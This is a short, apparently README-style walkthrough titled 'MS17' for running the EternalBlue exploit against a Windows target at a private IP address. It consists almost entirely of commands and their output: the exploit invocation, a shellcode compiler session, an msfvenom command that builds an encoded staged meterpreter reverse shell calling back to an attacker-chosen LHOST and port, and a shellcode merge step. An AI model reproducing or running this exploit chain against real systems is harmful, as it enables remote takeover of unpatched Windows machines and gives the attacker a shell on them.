# MS17

python3 eternalblue_exploit7.py 192.168.1.10 scx86.bin

./shell86.sh 
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
192.168.1.14
LPORT you want x86 to listen on:
6666
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
0
Type 0 to generate a staged payload or 1 to generate a stageless payload
0

Generating x86 meterpreter shell (staged)...

msfvenom -p windows/meterpreter/reverse_tcp -f raw -o scx86msf.bin EXITFUNC=thread LHOST=192.168.1.14 LPORT=6666 -e x86/shikata_ga_nai -i 10 -b \x00\x5c --platform windows
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 402 (iteration=0)
x86/shikata_ga_nai succeeded with size 429 (iteration=1)
x86/shikata_ga_nai succeeded with size 456 (iteration=2)
x86/shikata_ga_nai succeeded with size 483 (iteration=3)
x86/shikata_ga_nai succeeded with size 510 (iteration=4)
x86/shikata_ga_nai succeeded with size 537 (iteration=5)
x86/shikata_ga_nai succeeded with size 564 (iteration=6)
x86/shikata_ga_nai succeeded with size 591 (iteration=7)
x86/shikata_ga_nai succeeded with size 618 (iteration=8)
x86/shikata_ga_nai succeeded with size 645 (iteration=9)
x86/shikata_ga_nai chosen with final size 645
Payload size: 645 bytes
Saved as: scx86msf.bin

MERGING SHELLCODE WOOOO!!!
Usage: eternalblue_sc_merge.py sc_x86 sc_x64 sc_out
DONE
